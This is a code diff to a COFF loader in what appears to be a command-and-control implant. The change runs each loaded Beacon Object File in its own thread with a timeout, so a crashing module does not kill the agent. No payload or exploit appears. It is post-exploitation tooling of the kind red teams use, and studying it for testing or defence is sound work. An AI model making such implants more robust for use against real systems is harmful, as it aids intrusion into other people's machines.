@@ -326,9 +326,23 @@ static const char *get_symbol_name(const COFF_SYMBOL *sym,
     }
 }
 
-/* ─── Main COFF load & execute ─── */
+/* ─── BOF thread wrapper for crash isolation ─── */
 
 typedef void (__cdecl *BofEntryFunc)(char *args, int args_len);
+
+typedef struct {
+    BofEntryFunc entry;
+    char        *args;
+    int          args_len;
+} BOF_THREAD_CTX;
+
+static DWORD WINAPI bof_thread_proc(LPVOID param) {
+    BOF_THREAD_CTX *ctx = (BOF_THREAD_CTX *)param;
+    ctx->entry(ctx->args, ctx->args_len);
+    return 0;
+}
+
+/* ─── Main COFF load & execute ─── */
 
 BOOL coff_load_and_execute(
     const unsigned char *coff_data,
@@ -726,8 +740,41 @@ BOOL coff_load_and_execute(
         }
     }
 
-    /* Call the BOF entry point */
-    entry((char *)arg_data, (int)arg_len);
+    /* Call the BOF entry point in a separate thread for crash isolation.
+     * If the BOF triggers an access violation or other fatal exception,
+     * only the worker thread dies — the agent survives. */
+    {
+        BOF_THREAD_CTX tctx;
+        tctx.entry    = entry;
+        tctx.args     = (char *)arg_data;
+        tctx.args_len = (int)arg_len;
+
+        HANDLE hThread = CreateThread(NULL, 0, bof_thread_proc, &tctx, 0, NULL);
+        if (hThread) {
+            DWORD waitRet = WaitForSingleObject(hThread, 300000); /* 5 min timeout */
+            DWORD exitCode = 0;
+            GetExitCodeThread(hThread, &exitCode);
+
+            if (waitRet == WAIT_TIMEOUT || exitCode == STILL_ACTIVE) {
+                /* Timed out — kill the thread */
+                TerminateThread(hThread, 1);
+                CloseHandle(hThread);
+                BeaconPrintf(0x0d, "[!] COFF: BOF timed out after 300s — thread terminated\n");
+            } else {
+                CloseHandle(hThread);
+                if (exitCode != 0) {
+                    /* Thread crashed with an exception code */
+                    BeaconPrintf(0x0d,
+                        "[!] COFF: BOF crashed with exception 0x%08X\n", exitCode);
+                }
+            }
+        } else {
+            /* CreateThread failed — fall back to direct call (risky) */
+            BeaconPrintf(0x0d, "[!] COFF: CreateThread failed (%u), running BOF inline\n",
+                         GetLastError());
+            entry((char *)arg_data, (int)arg_len);
+        }
+    }
 
     /* ─── Step 10: Collect output and cleanup ─── */
     if (g_bof_output_len > 0 && output && output_len) {
